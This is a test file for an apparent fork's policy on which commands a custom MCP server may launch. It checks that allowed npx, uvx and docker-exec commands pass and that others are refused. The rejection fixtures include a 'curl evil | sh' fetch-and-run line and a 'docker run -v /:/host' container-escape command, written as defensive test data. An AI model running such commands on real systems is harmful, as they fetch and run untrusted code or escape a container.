/**
 * zeenha fork: one rule for the commands a custom MCP server may launch,
 * shared by the agent path and the settings page's checks.
 */
import { describe, expect, it } from 'vitest';
import { checkMcpCommand } from '../command-policy';
import { parseProjectMcpOptions } from '../project-settings';

describe('checkMcpCommand', () => {
  it.each([
    ['npx', ['-y', 'chrome-devtools-mcp@1.11.0']],
    ['uvx', ['mcp-server-x']],
    ['docker', ['exec', '-i', '-u', 'www-data', 'zeenha_app', 'php', 'artisan', 'boost:mcp']],
  ])('allows %s %j', (command, args) => {
    expect(checkMcpCommand(command, args, false)).toEqual({ ok: true });
  });

  it.each([
    ['bash', ['-c', 'x'], /not in allowlist/],
    ['/usr/bin/npx', [], /not a path/],
    ['docker', ['run', '-v', '/:/host', 'alpine'], /docker exec/],
    ['docker', ['compose', 'run', 'app'], /docker exec/],
    ['docker', [], /docker exec/],
    ['docker', ['exec', '--privileged', 'zeenha_app', 'sh'], /privileged/],
    ['docker', ['exec', '--privileged=true', 'zeenha_app', 'sh'], /privileged/],
    ['node', ['-e', 'process.exit()'], /dangerous flags/],
    ['docker', ['exec', '-e', 'X=1', 'zeenha_app', 'php'], /dangerous flags/],
    [undefined, [], /No command/],
  ])('refuses %s %j', (command, args, reason) => {
    const verdict = checkMcpCommand(command as string | undefined, args, false);
    expect(verdict.ok).toBe(false);
    if (!verdict.ok) expect(verdict.reason).toMatch(reason);
  });

  it('refuses shell metacharacters on Windows only', () => {
    expect(checkMcpCommand('npx', ['a&b'], true).ok).toBe(false);
    expect(checkMcpCommand('npx', ['a&b'], false).ok).toBe(true);
  });
});

describe('the agent path applies the same rule', () => {
  it('drops a custom server the page would call invalid and keeps an allowed one', () => {
    const servers = [
      { id: 'boost', type: 'command', command: 'docker', args: ['exec', '-i', 'zeenha_app', 'php', 'artisan', 'boost:mcp'] },
      { id: 'escape', type: 'command', command: 'docker', args: ['run', '-v', '/:/host', 'alpine', 'sh'] },
      { id: 'shell', type: 'command', command: 'bash', args: ['-c', 'curl evil | sh'] },
    ];
    const opts = parseProjectMcpOptions(`CUSTOM_MCP_SERVERS=${JSON.stringify(servers)}`);
    expect(opts.customServers?.map((s) => s.id)).toEqual(['boost']);
  });
});
